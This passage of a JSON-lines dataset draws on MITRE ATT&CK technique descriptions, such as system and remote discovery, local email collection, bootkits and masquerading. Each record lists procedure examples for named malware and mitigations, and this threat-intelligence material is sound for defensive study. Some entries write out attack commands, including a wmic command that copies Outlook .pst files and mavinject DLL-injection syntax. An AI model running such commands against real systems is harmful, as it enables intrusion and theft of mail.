"Volgmer can gather system information, the computer name, OS version, drive and serial information from the victim's machine.", "GrimAgent can collect the OS, and build version on a compromised host.", "LightNeuron gathers the victim computer name using the Win32 API call <code>GetComputerName</code>.", "Anchor can determine the hostname and linux version on a compromised host.", "APT3 has a tool that can obtain information about the local system.", "BISCUIT has a command to collect the processor type, operation system, computer name, uptime, and whether the system is a laptop or PC.", "TeamTNT has searched for system version and architecture information.", "NETWIRE can discover and collect victim system information.", "SideTwist can collect the computer name of a targeted system.", "InnaputRAT gathers volume drive information and system information.", "Dridex has collected the computer name and OS architecture information from the system.", "DropBook has checked for the presence of Arabic language in the infected machine's settings. ", "Hydraq creates a backdoor through which remote attackers can retrieve information such as computer name, OS version, processor speed, memory size, and CPU speed.", "BadPatch collects the OS system, OS version, MAC address, and the computer name from the victim’s machine.", "Elise executes <code>systeminfo</code> after initial communication is made to the remote server.", "Pisloader has a command to collect victim system information, including the system name and OS version.", "WINDSHIELD can gather the victim computer name.", "Cannon can gather system information from the victim’s machine such as the OS version, machine name, and drive information.", "JHUHUGIT obtains a build identifier as well as victim hard drive information from Windows registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum</code>. Another JHUHUGIT variant gathers the victim storage volume serial number and the storage device name.", "StreamEx has the ability to enumerate system information.", "Windigo has used a script to detect which Linux distribution and version is currently installed on the system.", "TrickBot gathers the OS version, machine name, CPU type, amount of RAM available, and UEFI/BIOS firmware information from the victim’s machine.", "MarkiRAT can obtain the computer name from a compromised host.", "IcedID has the ability to identify the computer name and OS version on a compromised host.", "YAHOYAH checks for the system’s Windows OS version and hostname.", "cmd can be used to find information about the operating system.", "Bazar can fingerprint architecture, computer name, and OS version on the compromised host. Bazar can also check if the Russian language is installed on the infected machine and terminate if it is found.", "AppleSeed can identify the OS version of a targeted system.", "Wingbird checks the victim OS version after executing to determine where to drop files based on whether the victim is 32-bit or 64-bit.", "Industroyer collects the victim machine’s Windows GUID.", "ZxShell can collect the local hostname, operating system details, CPU speed, and total physical memory. ", "MoleNet can collect information about the about the system.", "SharpStage has checked the system settings to see if Arabic is the configured language.", "A module in Prikormka collects information from the victim about Windows OS version, computer name, battery info, and physical memory.", "Kessel has collected the system architecture, OS version, and MAC address information.", "SynAck gathers computer names, OS version info, and also checks installed keyboard layouts to estimate if it has been launched from a certain list of countries.", "Penquin can report the file system type and disk space of a compromised host to C2.", "NOKKI can gather information on drives and the operating system on the victim’s machine.", "LiteDuke can enumerate the CPUID and BIOS version on a compromised system.", "Sidewinder has used tools to collect the computer name, OS version, installed hotfixes, as well as information regarding the memory and processor on a compromised host.", "Sys10 collects the computer name, OS versioning information, and OS install date and sends the information to the C2.", "Turian can retrieve system information including OS version, memory usage, local hostname, and system adapter information.", "QuasarRAT has a command to gather system information from the victim’s machine.", "Machete collects the hostname of the target computer. ", "ROKRAT gathers the computer name and checks the OS version to ensure it doesn’t run on a Windows XP or Windows Server 2003 systems.", "ServHelper will attempt to enumerate Windows version and system architecture.", "Stealth Falcon malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory.", "QakBot can collect system information including the OS version and domain on a compromised host.", "WellMess can identify the computer name of a compromised host.", "RATANKBA gathers information about the OS architecture, OS name, and OS version/Service pack.", "SUNBURST collected hostname, OS version, and device uptime.", "T9000 gathers and beacons the operating system build number and CPU Architecture (32-bit/64-bit) during installation.", "MURKYTOP has the capability to retrieve information about the OS.", "Kazuar gathers information on the system and local drives.", "Skidmap has the ability to check whether the infected system’s OS is Debian or RHEL/CentOS to determine which cryptocurrency miner it should use.", "Kerrdown has the ability to determine if the compromised host is running a 32 or 64 bit OS architecture.", "Dtrack can collect the victim's computer name, hostname and adapter information to create a unique identifier.", "Kobalos can record the hostname and kernel version of the target machine.", "BackConfig has the ability to gather the victim's computer name.", "FinFisher checks if the victim OS is 32 or 64-bit.", "SLOTHFULMEDIA has collected system name, OS version, adapter information, memory usage, and disk information from a victim machine.", "BlackMould can enumerate local drives on a compromised host.", "CrackMapExec can enumerate the system drives and associated system name.", "Patchwork collected the victim computer name, OS version, and architecture type and sent the information to its C2 server. Patchwork also enumerated all available drives on the victim's machine.", "Hildegard has collected the host's OS, CPU, and memory information.", "Bisonal has a command to gather system information from the victim’s machine.", "Felismus collects the system information, including hostname and OS version, and sends it to the C2 server.", "Lokibot has the ability to discover the computer name and Windows product name/version.", "Kwampirs collects OS version information such as registered owner details, manufacturer details, processor type, available storage, installed patches, hostname, version info, system date, and other system information by using the commands <code>systeminfo</code>, <code>net config workstation</code>, <code>hostname</code>, <code>ver</code>, <code>set</code>, and <code>date /t</code>.", "A system info module in CozyCar gathers information on the victim host’s configuration.", "BabyShark has executed the <code>ver</code> command.\t", "TYPEFRAME can gather the disk volume information.", "ChChes collects the victim hostname, window resolution, and Microsoft Windows version.", "Bandook can collect information about the drives available on the system. ", "EVILNUM can obtain the computer name from the victim's system.", "Micropsia gathers the hostname and OS version from the victim’s machine.", "Denis collects OS information and the computer name from the victim’s machine.", "NavRAT uses <code>systeminfo</code> on a victim’s machine.", "Linfo creates a backdoor through which remote attackers can retrieve system information.", "HAWKBALL can collect the OS version, architecture information, and computer name.", "CARROTBAT has the ability to determine the operating system of the compromised host and whether Windows is being run with x86 or x64 architecture.", "MoonWind can obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution.", "KillDisk retrieves the hard disk name by calling the <code>CreateFileA to \\\\.\\PHYSICALDRIVE0</code> API.", "Ke3chang performs operating system information discovery using <code>systeminfo</code>.", "OSInfo discovers information about the infected machine.", "Chaes has collected system information, including the machine name and OS version.", "FELIXROOT collects the victim’s computer name, processor architecture, OS version, volume serial number, and system type.", "Aria-body has the ability to identify the hostname, computer name, Windows version, processor speed, machine GUID, and disk information on a compromised host.", "POORAIM can identify system information, including battery status.", "POWERSTATS can retrieve OS name/architecture and computer/domain name information from compromised hosts."], "is_subtechnique": false}
{"text": " Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files. Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.(Citation: Microsoft Outlook Files)", "idx": "https://attack.mitre.org/techniques/T1114/001", "title": "Local Email Collection", "entity": "Local Email Collection", "entity_type": "techniques", "entity_context": ["Pupy can interact with a victim’s Outlook session and look through folders and emails.", "KGH_SPY can harvest data from mail clients.", "APT1 uses two utilities, GETMAIL and MAPIGET, to steal email. GETMAIL extracts emails from archived Outlook .pst files.", "Out1 can parse e-mails on a target machine.", "QakBot can target and steal locally stored emails to support thread hijacking phishing campaigns.\n", "Crimson contains a command to collect and exfiltrate emails from Outlook.", "Chimera has harvested data from victim's e-mail including through execution of <code>wmic /node:<ip> process call create \"cmd /c copy c:\\Users\\<username>\\<path>\\backup.pst c:\\windows\\temp\\backup.pst\" copy \"i:\\<path>\\<username>\\My Documents\\<filename>.pst\"\ncopy</code>.", "Use of encryption provides an added layer of security to sensitive information sent over email. Encryption using public key cryptography requires the adversary to obtain the private certificate along with an encryption key to decrypt messages.", "Empire has the ability to collect emails on a target system.", "Magic Hound has collected .PST archives.", "Carbanak searches recursively for Outlook personal storage tables (PST) files within user directories and sends them back to the C2 server.", "CosmicDuke searches for Microsoft Outlook data files with extensions .pst and .ost for collection and exfiltration.", "Emotet has been observed leveraging a module that scrapes email data from Outlook.", "Smoke Loader searches through Outlook files and directories (e.g., inbox, sent, templates, drafts, archives, etc.)."], "is_subtechnique": true}
{"text": " Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. Containers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow.(Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)", "idx": "https://attack.mitre.org/techniques/T1610", "title": "Deploy Container", "entity": "Deploy Container", "entity_type": "techniques", "entity_context": ["Kinsing was run through a deployed Ubuntu container.", "Doki was run through a deployed container.", "TeamTNT has deployed different types of containers into victim environments to facilitate execution.", "Enforce the principle of least privilege by limiting container dashboard access to only the necessary users.", "Limit communications with the container service to local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API, Kubernetes API Server, and container orchestration web applications.", "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."], "is_subtechnique": false}
{"text": " **This technique has been deprecated. Please use [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Component Object Model](https://attack.mitre.org/techniques/T1559/001).** Adversaries may use the Windows Component Object Model (COM) and Distributed Component Object Model (DCOM) for local code execution or to execute on remote systems as part of lateral movement. COM is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) DCOM is transparent middleware that extends the functionality of Component Object Model (COM) (Citation: Microsoft COM) beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019) Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry. (Citation: Microsoft COM ACL)(Citation: Microsoft Process Wide Com Keys)(Citation: Microsoft System Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM. Adversaries may abuse COM for local command and/or payload execution. Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and VBScript.(Citation: Microsoft COM) Specific COM objects also exists to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors such as Privilege Escalation and Persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write", "idx": "https://attack.mitre.org/techniques/T1175", "title": "Component Object Model and Distributed COM", "entity": "Component Object Model and Distributed COM", "entity_type": "techniques", "entity_context": ["Consider disabling DCOM through Dcomcnfg.exe.", "Ensure all COM alerts and Protected View are enabled.", "Modify Registry settings (directly or using Dcomcnfg.exe) in <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Classes\\\\AppID\\\\{AppID_GUID}</code> associated with the process-wide security of individual COM applications.\n\nModify Registry settings (directly or using Dcomcnfg.exe) in <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Ole</code> associated with system-wide security defaults for all COM applications that do no set their own process-wide security. ", "Enable Windows firewall, which prevents DCOM instantiation by default."], "is_subtechnique": false}
{"text": " Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039). Adversaries may also use local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) in order to discover the hostname to IP address mappings of remote systems.", "idx": "https://attack.mitre.org/techniques/T1018", "title": "Remote System Discovery", "entity": "Remote System Discovery", "entity_type": "techniques", "entity_context": ["Leafminer used Microsoft’s Sysinternals tools to gather detailed information about remote systems.", "PoetRAT used Nmap for remote system discovery.", "MURKYTOP has the capability to identify remote hosts on connected networks.", "WannaCry scans its local network segment for remote systems to try to exploit and copy itself to.", "\nConti has the ability to discover hosts on a target network.", "TrickBot can enumerate computers and network devices.", "Remsec can ping or traceroute a remote host.", "BloodHound can enumerate and collect the properties of domain computers, including domain controllers.", "Operation Wocao can use the <code>ping</code> command to discover remote systems.", "njRAT can identify remote hosts on connected networks.", "SpicyOmelette can identify payment systems, payment gateways, and ATM systems in compromised environments.", "QakBot can identify remote systems through the <code>net view</code> command.", "Olympic Destroyer uses Windows Management Instrumentation to enumerate all systems in the network.", "Turla surveys a system upon check-in to discover remote systems on a local network using the <code>net view</code> and <code>net view /DOMAIN</code> commands. Turla has also used <code>net group \"Domain Computers\" /domain</code>, <code>net group \"Domain Controllers\" /domain</code>, and <code>net group \"Exchange Servers\" /domain</code> to enumerate domain computers, including the organization's DC and Exchange Server.", "TRITON’s TsLow python module pings controllers over the TriStation protocol. ", "Comnie runs the <code>net view</code> command", "Dragonfly 2.0 likely obtained a list of hosts in the victim environment.", "Epic uses the <code>net view</code> command on the victim’s machine.", "Commands such as <code>net view</code> can be used in Net to gather information about available remote systems.", "Carbon uses the <code>net view</code> command.", "OSInfo performs a connection test to discover remote systems in the network", "BitPaymer can use <code>net view</code> to discover remote systems.", "GALLIUM used a modified version of NBTscan to identify available NetBIOS name servers over the network as well as <code>ping</code> to identify remote systems.", "NBTscan can list NetBIOS computer names.\t", "FIN8 has used dsquery and other Active Directory utilities to enumerate hosts; they have also used <code>nltest.exe /dclist</code> to retrieve a list of domain controllers.", "AdFind has the ability to query Active Directory for computers.", "APT29 has used AdFind to enumerate remote systems.", "Wizard Spider has used networkdll for network discovery and psfin specifically for financial and point of sale indicators. Wizard Spider has also used AdFind and <code>nltest/dclist</code> to enumerate domain computers, including the domain controller.", "Sykipot may use <code>net view /domain</code> to display hostnames of available systems on a network.", "Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about computers listed in AD. ", "Shamoon scans the C-class subnet of the IPs on the victim's interfaces.", "menuPass uses scripts to enumerate IP ranges on the victim network. menuPass has also issued the command <code>net view /domain</code> to a PlugX implant to gather information about remote systems on the network.", "Indrik Spider has used PowerView to enumerate all Windows Server, Windows Server 2003, and Windows 7 instances in the Active Directory database.", "RATANKBA runs the <code>net view /domain</code> and <code>net view</code> commands.", "APT3 has a tool that can detect the existence of remote systems.", "The TAINTEDSCRIBE command and execution module can perform target system enumeration.", "Nltest may be used to enumerate remote domain controllers using options such as <code>/dclist</code> and <code>/dsgetdc</code>.", "APT32 has enumerated DC servers using the command <code>net group \"Domain Controllers\" /domain</code>. The group has also used the <code>ping</code> command.", "Kinsing has used a script to parse files like <code>/etc/hosts</code> and SSH <code>known_hosts</code> to discover remote systems.", "FIN5 has used the open source tool Essential NetTools to map the network and build a list of targets.", "BRONZE BUTLER typically use <code>ping</code> and Net to enumerate systems.", "Threat Group-3390 has used the <code>net view</code> command.", "Industroyer can enumerate remote computers in the compromised network.", "Silence has used Nmap to scan the corporate network, build a network topology, and identify vulnerable hosts.\t", "SHOTPUT has a command to list all servers in the domain, as well as one to locate domain controllers on a domain.", "Deep Panda has used ping to identify other machines of interest.", "USBferry can use <code>net view</code> to gather information about remote systems.", "Bazar can enumerate remote systems using <code> Net View</code>.", "Fox Kitten has used Angry IP Scanner to detect remote systems.", "Naikon has used a netbios scanner for remote machine identification.", "FIN6 used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.", "Ping can be used to identify remote systems within a network.", "Kwampirs collects a list of available servers with the command <code>net view</code>.", "Rocke has looked for IP addresses in the known_hosts file on the infected system and attempted to SSH into them.\t", "Cobalt Strike uses the native Windows Network Enumeration APIs to interrogate and discover targets in a Windows Active Directory network.", "APT39 has used NBTscan and custom tools to discover remote systems.", "yty uses the <code>net view</code> command for discovery.", "Chimera has utilized various scans and queries to find domain controllers and remote services in the target environment.", "CrackMapExec can discover active IP addresses, along with the machine name, within a targeted network.", "Ke3chang has used network scanning and enumeration tools, including Ping."], "is_subtechnique": false}
{"text": " Adversaries may insert, delete, or manipulate data in order to manipulate external outcomes or hide activity. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.", "idx": "https://attack.mitre.org/techniques/T1565", "title": "Data Manipulation", "entity": "Data Manipulation", "entity_type": "techniques", "entity_context": ["Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and manipulate backups.", "Consider encrypting important information to reduce an adversary’s ability to perform tailored data modifications.", "Ensure least privilege principles are applied to important information resources to reduce exposure to data manipulation risk.", "Identify critical business and system processes that may be targeted by adversaries and work to isolate and secure those systems against unauthorized access and tampering."], "is_subtechnique": false}
{"text": " Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use. Adversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files. (Citation: US-CERT TA18-106A Network Infrastructure Devices 2018) (Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis.", "idx": "https://attack.mitre.org/techniques/T1602/002", "title": "Network Device Configuration Dump", "entity": "Network Device Configuration Dump", "entity_type": "techniques", "entity_context": ["Keep system images and software updated and migrate to SNMPv3. ", "Apply extended ACLs to block unauthorized protocols outside the trusted network. ", "Segregate SNMP traffic on a separate management network  ", "onfigure intrusion prevention devices to detect SNMP queries and commands from unauthorized sources. Create signatures to detect Smart Install (SMI) usage from sources other than trusted director. ", "Allowlist MIB objects and implement SNMP views. Disable Smart Install (SMI) if not used.   ", "Configure SNMPv3 to use the highest level of security (authPriv) available.  "], "is_subtechnique": true}
{"text": " Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly. A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011) The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.", "idx": "https://attack.mitre.org/techniques/T1542/003", "title": "Bootkit", "entity": "Bootkit", "entity_type": "techniques", "entity_context": ["APT28 has deployed a bootkit along with Downdelph to ensure its persistence on the victim. The bootkit shares code with some variants of BlackEnergy.", "ROCKBOOT is a Master Boot Record (MBR) bootkit that uses the MBR to establish persistence.", "Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised.  ", "TrickBot can implant malicious code into a compromised device's firmware.", "Lazarus Group malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.", "APT41 deployed Master Boot Record bootkits on Windows systems to hide their malware and maintain persistence on victim systems.", "Ensure proper permissions are in place to help prevent adversary access to privileged accounts necessary to install a bootkit.", "Some FinFisher variants incorporate an MBR rootkit.", "Carberp has installed a bootkit on the system to maintain persistence.", "BOOTRASH is a Volume Boot Record (VBR) bootkit that uses the VBR to maintain persistence."], "is_subtechnique": true}
{"text": " Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level. Adversaries may abuse Active Setup by creating a key under <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016) Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.", "idx": "https://attack.mitre.org/techniques/T1547/014", "title": "Active Setup", "entity": "Active Setup", "entity_type": "techniques", "entity_context": ["PoisonIvy creates a Registry key in the Active Setup pointing to a malicious executable."], "is_subtechnique": true}
{"text": " Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject) Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>).(Citation: ATT Lazarus TTP Evolution)(Citation: Reaqta Mavinject) Since mavinject.exe is digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. In addition to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001), Mavinject.exe can also be abused to perform import descriptor injection via its <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.(Citation: Mavinject Functionality Deconstructed)", "idx": "https://attack.mitre.org/techniques/T1218/013", "title": "Mavinject", "entity": "Mavinject", "entity_type": "techniques", "entity_context": ["Consider removing mavinject.exe if Microsoft App-V is not used within a given environment.", "Use application control configured to block execution of mavinject.exe if it is not required for a given system or network to prevent potential misuse by adversaries."], "is_subtechnique": true}
{"text": " Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones. Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)", "idx": "https://attack.mitre.org/techniques/T1036/004", "title": "Masquerade Task or Service", "entity": "Masquerade Task or Service", "entity_type": "techniques", "entity_context": ["ComRAT has used a task name associated with Windows SQM Consolidator.", "Naikon renamed a malicious service <code>taskmgr</code> to appear to be a legitimate version of Task Manager.", "Seasalt has masqueraded as a service called \"SaSaut\" with a display name of \"System Authorization Service\" in an apparent attempt to masquerade as a legitimate service.", "ZIRCONIUM has created a run key named <code>Dropbox Update Setup</code> to mask a persistence mechanism for a malicious binary.", "Machete renamed task names to masquerade as legitimate Google Chrome, Java, Dropbox, Adobe Reader and Python tasks. ", "GoldMax has impersonated systems management software to avoid detection.", "New services created by RawPOS are made to appear like legitimate Windows services, with names such as \"Windows Management Help Service\", \"Microsoft Support\", and \"Windows Advanced Task Manager\".", "Carbanak has copied legitimate service names to use for malicious services.", "ShimRat can impersonate Windows services and antivirus products to avoid detection on compromised systems.", "Crutch has established persistence with a scheduled task impersonating the Outlook item finder.", "FIN7 has created a scheduled task named “AdobeFlashSync” to establish persistence.", "SLOTHFULMEDIA has named a service it establishes on victim machines as \"TaskFrame\" to hide its malicious purpose. ", "Bazar can create a task named to appear benign.", "RainyDay has named services and scheduled tasks to appear benign including \"ChromeCheck\" and \"googleupdate.\"", "The Exaramel for Windows dropper creates and starts a Windows service named wsmprovav with the description “Windows Check AV” in an apparent attempt to masquerade as a legitimate service.", "build_downer has added itself to the Registry Run key as \"NVIDIA\" to appear legitimate.", "Kimsuky has disguised services to appear as benign software or related to operating system functions.", "Catchamas adds a new service named NetAdapter in an apparent attempt to masquerade as a legitimate service.", "Okrum can establish persistence by adding a new service NtmsSvc with the display name Removable Storage to masquerade as a legitimate Removable Storage Manager.", "InnaputRAT variants have attempted to appear legitimate by adding a new service named OfficeUpdateService.", "Egregor has masqueraded the svchost.exe process to exfiltrate data.", "APT-C-36 has disguised its scheduled tasks as those used by Google.", "Shamoon creates a new service named “ntssrv” that attempts to appear legitimate; the service's display name is “Microsoft Network Realtime Inspection Service” and its description is “Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols.” Newer versions create the \"MaintenaceSrv\" service, which misspells the word \"maintenance.\"", "Fysbis has masqueraded as the rsyncd and dbus-inotifier services.", "Kwampirs establishes persistence by adding a new service with the display name \"WMI Performance Adapter Extension\" in an attempt to masquerade as a legitimate WMI service.", "APT29 named tasks <code>\\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager</code> in order to appear legitimate.", "Wizard Spider has used scheduled tasks to install TrickBot, using task names to appear legitimate such as WinDotNet, GoogleTask, or Sysnetsf. It has also used common document file names for other malware binaries.", "Turian can disguise as a legitimate service to blend into normal operations.", "Fox Kitten has named the task for a reverse proxy lpupdate to appear legitimate.", "To establish persistence, Truvasys adds a Registry Run key with a value \"TaskMgr\" in an attempt to masquerade as the legitimate Windows Task Manager.", "StrongPity has named services to appear legitimate.", "POWERSTATS has created a scheduled task named \"MicrosoftEdge\" to establish persistence.", "Attor's dispatcher disguises itself as a legitimate task (i.e., the task name and description appear legitimate).", "In one instance, menuPass added PlugX as a service with a display name of \"Corel Writing Tools Utility.\"", "Hildegard has disguised itself as a known Linux process.", "CSPY Downloader has attempted to appear as a legitimate Windows service with a fake description claiming it is used to support packed applications.", "Nidiran can create a new service named msamger (Microsoft Security Accounts Manager), which mimics the legitimate Microsoft database by the same name.", "BackdoorDiplomacy has disguised their backdoor droppers with naming conventions designed to blend into normal operations.", "APT32 has used hidden or non-printing characters to help masquerade service names, such as appending a Unicode no-break space character to a legitimate service name. APT32 has also impersonated the legitimate Flash installer file name \"install_flashplayer.exe\".", "OSX_OCEANLOTUS.D has disguised its app bundle by adding special characters to the filename and using the icon for legitimate Word documents.", "IronNetInjector has been disguised as a legitimate service using the name PythonUpdateSrvc.", "Maze operators have created scheduled tasks masquerading as \"Windows Update Security\", \"Windows Update Security Patches\", and \"Google Chrome Security Update\" designed to launch the ransomware. ", "Some Volgmer variants add new services with display names generated by a list of hard-coded strings such as Application, Background, Security, and Windows, presumably as a way to masquerade as a legitimate service.", "KillDisk registers as a service under the Plug-And-Play Support name.", "APT41 has created services to appear as benign system tools.", "RTM has named the scheduled task it creates \"Windows Update\".", "Higaisa named a shellcode loader binary <code>svchast.exe</code> to spoof the legitimate <code>svchost.exe</code>. ", "PROMETHIUM has named services to appear legitimate.", "FIN6 has renamed the \"psexec\" service name to \"mstdc\" to masquerade as a legitimate Windows service.\t", "InvisiMole has attempted to disguise itself by registering under a seemingly legitimate service name.", "Nebulae has created a service named \"Windows Update Agent1\" to appear legitimate.", "RDAT has used Windows Video Service as a name for malicious services."], "is_subtechnique": true}
{"text": " Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.). Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or for initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).", "idx": "https://attack.mitre.org/techniques/T1592/002", "title": "Software", "entity": "Software", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties.", "Andariel has inserted a malicious script within compromised websites to collect potential victim information such as browser type, system language, Flash Player version, and other data.", "Sandworm Team has researched software code to enable supply-chain operations, most notably for the 2017 NotPetya attack. Sandworm Team also collected a list of computers using specific software as part of its targeting efforts."], "is_subtechnique": true}
